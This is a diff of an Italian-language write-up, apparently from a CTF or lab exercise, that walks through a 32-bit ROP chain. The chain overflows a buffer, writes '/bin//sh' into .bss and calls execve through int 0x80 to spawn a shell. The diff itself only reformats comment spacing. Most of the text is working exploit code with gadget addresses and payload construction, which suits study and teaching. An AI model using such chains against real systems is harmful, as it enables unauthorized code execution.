@@ -57,16 +57,16 @@ In `write_1` saranno scritti i primi 4 byte "/bin", mentre in `write_2` la secon
 
 Chain di scrittura "/bin/sh":
 ```
-payload += p(pop_edx)		# EDX will point to .bss start 
+payload += p(pop_edx)  # EDX will point to .bss start 
 payload += p(write_1)
-payload += p(pop_eax)		# writes "/bin" in EAX
+payload += p(pop_eax)  # writes "/bin" in EAX
 payload += "/bin"
-payload += p(mov_mem)		# moves EAX="/bin" at address pointed by EDX (.bss start)
+payload += p(mov_mem)  # moves EAX="/bin" at address pointed by EDX (.bss start)
 payload += p(pop_edx)
-payload += p(write_2)		# EDX will point at .bss start + 4
-payload += p(pop_eax)		# writes "//sh" in EAX
+payload += p(write_2)  # EDX will point at .bss start + 4
+payload += p(pop_eax)  # writes "//sh" in EAX
 payload += "//sh"
-payload += p(mov_mem)		# moves EAX="//sh" at address pointed by EDX (.bss start + 4)
+payload += p(mov_mem)  # moves EAX="//sh" at address pointed by EDX (.bss start + 4)
 ```
 
 Per prima cosa è stato utilizzato `pop_edx` per inserire `write_1` in `edx` (`pop edx`).
@@ -84,15 +84,15 @@ Alla fine della chain "/bin/sh" sarà scritto all'indirizzo di memoria `write_1`
 #### EDX=0 e EBX->"/bin//sh"
 
 ```
-xor_eax = 0x0804a3c3	# xor eax, eax ; ret
-xor_edx = 0x08098280	# xor edx, edx ; div esi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+xor_eax = 0x0804a3c3  # xor eax, eax ; ret
+xor_edx = 0x08098280  # xor edx, edx ; div esi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
 
 ```
 
 Chain usata:
 ```
-payload += p(xor_eax)		# EAX = 0
-payload += p(xor_edx)		# EDX=0; EBX = address of "/bin//sh"
+payload += p(xor_eax)  # EAX = 0
+payload += p(xor_edx)  # EDX=0; EBX = address of "/bin//sh"
 payload += p(write_1)
 payload += "JUNK" * 3
 ```
@@ -111,13 +111,13 @@ l'indirizzo `write_1` (che contiene "/bin//sh") nel regitro `ebx`.
 #### ECX=0
 
 ```
-mov_ecx = 0x0805e319	# mov ecx, edx ; rep stosb byte ptr es:[edi], al ; mov eax, dword ptr [esp + 8] ; pop edi ; ret
+mov_ecx = 0x0805e319  # mov ecx, edx ; rep stosb byte ptr es:[edi], al ; mov eax, dword ptr [esp + 8] ; pop edi ; ret
 
 ```
 
 Chain usata:
 ```
-payload += p(mov_ecx)		# ECX = 0
+payload += p(mov_ecx)  # ECX = 0
 payload += "JUNK"
 ```
 
@@ -126,12 +126,12 @@ il gadget `mov_ecx` è stato usato per copiare il contenuto di `edx` in `ecx`, o
 #### EAX=0xb
 
 ```
-pop_edx = 0x0807662a    # pop edx; ret
-pop_eax = 0x080bc865    # pop eax; ret
-sub_eax = 0x080562dc    # sub eax,edx; ret
+pop_edx = 0x0807662a  # pop edx; ret
+pop_eax = 0x080bc865  # pop eax; ret
+sub_eax = 0x080562dc  # sub eax,edx; ret
 
 execve_num1 = 0x4141411b
-execve_num2 = 0x41414110	# (execve_num1 - execve_num2) = 0xb; avoiding null bytes
+execve_num2 = 0x41414110  # (execve_num1 - execve_num2) = 0xb; avoiding null bytes
 
 ```
 
@@ -139,10 +139,10 @@ Chain usata:
 
 ```
 payload += p(pop_edx)
-payload += p(execve_num2)	# EDX=0x41414110
+payload += p(execve_num2)  # EDX=0x41414110
 payload += p(pop_eax)
-payload += p(execve_num1)	# EAX=0x4141411b
-payload += p(sub_eax)		# EAX = EAX - EDX = 0xb
+payload += p(execve_num1)  # EAX=0x4141411b
+payload += p(sub_eax)  # EAX = EAX - EDX = 0xb
 
 ```
 
@@ -157,15 +157,15 @@ Non è stato inserito direttamente il valore `0x0000000b` poichè contiene null 
 #### EDX=0
 
 ```
-mov_edx = 0x08055b85	# mov edx, 0xffffffff ; ret
-inc_edx = 0x0805eca7	# inc edx ; ret
+mov_edx = 0x08055b85  # mov edx, 0xffffffff ; ret
+inc_edx = 0x0805eca7  # inc edx ; ret
 
 ```
 
 Chain usata:
 ```
-payload += p(mov_edx)		# EDX=0xffffffff
-payload += p(inc_edx)		# INC EDX -> EDX = 0
+payload += p(mov_edx)  # EDX=0xffffffff
+payload += p(inc_edx)  # INC EDX -> EDX = 0
 
 ```
 
@@ -176,13 +176,13 @@ payload += p(inc_edx)		# INC EDX -> EDX = 0
 #### INT 0x80
 
 ```
-int_80  = 0x0804e9f5	# int 0x80
+int_80  = 0x0804e9f5  # int 0x80
 
 ```
 
 Chain usata:
 ```
-payload += p(int80)		#call execve()
+payload += p(int80)  #call execve()
 
 ```
 
@@ -199,16 +199,16 @@ def p(x):
   return struct.pack('<I', x)
 
 # Gadgets
-xor_edx = 0x08098280	# xor edx, edx ; div esi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
-xor_eax = 0x0804a3c3	# xor eax, eax ; ret
-mov_ecx = 0x0805e319	# mov ecx, edx ; rep stosb byte ptr es:[edi], al ; mov eax, dword ptr [esp + 8] ; pop edi ; ret
+xor_edx = 0x08098280  # xor edx, edx ; div esi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+xor_eax = 0x0804a3c3  # xor eax, eax ; ret
+mov_ecx = 0x0805e319  # mov ecx, edx ; rep stosb byte ptr es:[edi], al ; mov eax, dword ptr [esp + 8] ; pop edi ; ret
 pop_edx = 0x0807662a  # pop edx; ret
 pop_eax = 0x080bc865  # pop eax; ret
 sub_eax = 0x080562dc  # sub eax,edx; ret
-mov_mem = 0x080562ab 	# mov dword ptr [edx], eax ; ret
-mov_edx = 0x08055b85	# mov edx, 0xffffffff ; ret
-inc_edx = 0x0805eca7	# inc edx ; ret
-int_80  = 0x0804e9f5	# int 0x80
+mov_mem = 0x080562ab  # mov dword ptr [edx], eax ; ret
+mov_edx = 0x08055b85  # mov edx, 0xffffffff ; ret
+inc_edx = 0x0805eca7  # inc edx ; ret
+int_80  = 0x0804e9f5  # int 0x80
 
 # Values
 execve_num1 = 0x4141411b
@@ -217,28 +217,28 @@ write_1 = 0x080f1010      # used for writing "/bin" to .bss start address
 write_2 = 0x080f1014      # used for writing "//sh" to .bss start + 4
 
 # ROP Chain
-payload = "A"*544		    # fill the buffer
-payload += "BBBB"		    # EBP overwrite
-payload += p(pop_edx)		# point EDX to .bss start
+payload = "A"*544       # fill the buffer
+payload += "BBBB"       # EBP overwrite
+payload += p(pop_edx)   # point EDX to .bss start
 payload += p(write_1)
-payload += p(pop_eax)		# put "/bin" into EAX
+payload += p(pop_eax)   # put "/bin" into EAX
 payload += "/bin"
-payload += p(mov_mem)		# move EAX="/bin" to address pointed by EDX (.bss start)
+payload += p(mov_mem)   # move EAX="/bin" to address pointed by EDX (.bss start)
 payload += p(pop_edx)
-payload += p(write_2)		# point to .bss start + 4
-payload += p(pop_eax)		# put "//sh" into EAX
+payload += p(write_2)   # point to .bss start + 4
+payload += p(pop_eax)   # put "//sh" into EAX
 payload += "//sh"
-payload += p(mov_mem)		# move EAX="//sh" to address pointed by EDX (.bss start + 4)
-payload += p(xor_eax)		# EAX = 0; needed because of "div esi" into next gadget (div esi puts division results into EAX and EDX, and we want EDX=0)
-payload += p(xor_edx)		# EDX=0; EBX = address of "/bin//sh"
+payload += p(mov_mem)   # move EAX="//sh" to address pointed by EDX (.bss start + 4)
+payload += p(xor_eax)   # EAX = 0; ("div esi" puts division results into EAX and EDX, and we want EDX=0)
+payload += p(xor_edx)   # EDX=0; EBX = address of "/bin//sh"
 payload += p(write_1)
 payload += "JUNK" * 3
-payload += p(mov_ecx)		# ECX = 0
+payload += p(mov_ecx)   # ECX = 0
 payload += "JUNK"
 payload += p(pop_edx)
-payload += p(execve_num2)	# EDX=0x41414110
+payload += p(execve_num2) # EDX=0x41414110
 payload += p(pop_eax)
-payload += p(execve_num1)	# EAX=0x4141411b
+payload += p(execve_num1) # EAX=0x4141411b
 payload += p(sub_eax)     # EAX = EAX - EDX = 0xb
 payload += p(mov_edx)     # EDX=0xffffffff
 payload += p(inc_edx)     # INC EDX -> EDX = 0
